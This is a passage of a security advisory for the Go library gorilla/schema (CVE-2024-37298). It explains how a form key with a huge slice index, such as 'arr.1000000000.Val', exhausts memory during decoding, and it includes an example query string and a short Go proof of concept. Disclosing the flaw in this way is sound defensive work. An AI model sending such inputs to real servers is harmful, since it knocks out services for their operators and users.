For instance, in the Proof of Concept written below, someone can specify to set a field of the billionth element and it will allocate all other elements before it in the slice.</p>\n<p>In the local environment environment for my project, I was able to call an endpoint like <code>/innocent_endpoint?arr.10000000.X=1</code> and freeze my system from the memory allocation while parsing <code>r.Form</code>. I think <a href=\"https://github.com/gorilla/schema/blob/main/decoder.go#L223\">this line</a> is responsible for allocating the slice, although I haven't tested to make sure, so it's just an educated guess.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<p>The following proof of concept works on both v1.2.0 and v1.2.1. I have not tested earlier versions.</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/gorilla/schema\"\n)\n\nfunc main() {\n    dec := schema.NewDecoder()\n    var result struct {\n        Arr []struct{ Val int }\n    }\n    if err := dec.Decode(&amp;result, map[string][]string{\"arr.1000000000.Val\": {\"1\"}}); err != nil {\n        panic(err)\n    }\n    fmt.Printf(\"%#+v\\n\", result)\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any use of <code>schema.Decoder.Decode()</code> on a struct with arrays of other structs could be vulnerable to this memory exhaustion vulnerability. There seems to be no possible solution that a developer using this library can do to disable this behaviour without fixing it in this project, so all uses of Decode that fall under this umbrella are affected. A fix that doesn't require a major change may also be harder to find, since it could break compatibility with some other intended use-cases.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3\">https://github.com/gorilla/schema/security/advisories/GHSA-3669-72x9-r9p3</a></li>\n<li><a href=\"https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff\">https://github.com/gorilla/schema/commit/cd59f2f12cbdfa9c06aa63e425d1fe4a806967ff</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37298\">https://nvd.nist.gov/vuln/detail/CVE-2024-37298</a></li>\n<li><a href=\"https://github.com/gorilla/schema/blob/main/decoder.go#L223\">https://github.com/gorilla/schema/blob/main/decoder.go#L223</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3669-72x9-r9p3\">https://github.com/advisories/GHSA-3669-72x9-r9p3</a></li>\n</ul>\n",
